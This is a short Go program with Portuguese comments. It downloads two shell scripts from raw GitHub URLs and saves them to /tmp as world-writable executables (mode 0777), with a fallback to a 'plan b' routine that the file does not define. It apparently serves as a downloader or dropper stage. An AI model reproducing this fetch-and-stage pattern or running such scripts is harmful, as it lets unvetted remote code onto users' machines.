package main


import (

"fmt"
"net/http"
"io/ioutil"
)




func down_vkzmn()  {


fmt.Println("abaixando vkzmn")


cli := http.Client{}


resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/down.sh")


 if err_get != nil {


 fmt.Println(err_get)  //erro no github.com 


     down_raw() // call  plane b


           return
   }
script  , err_readall :=  ioutil.ReadAll(resp.Body) 

   if err_readall  != nil  {


       fmt.Println("erro em readall")


           down_raw() 

           return 

            }



ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )
 


}







func down_mo(){







cli := http.Client{}

resp , err_get :=   cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/mo.sh")

 

    if err_get != nil {return }


mo_bytes  , err_readall := ioutil.ReadAll(resp.Body)


  if  err_readall != nil {  return  }

  

     ioutil.WriteFile("/tmp/mo.sh" , mo_bytes , 0777)
      

     
 

}

















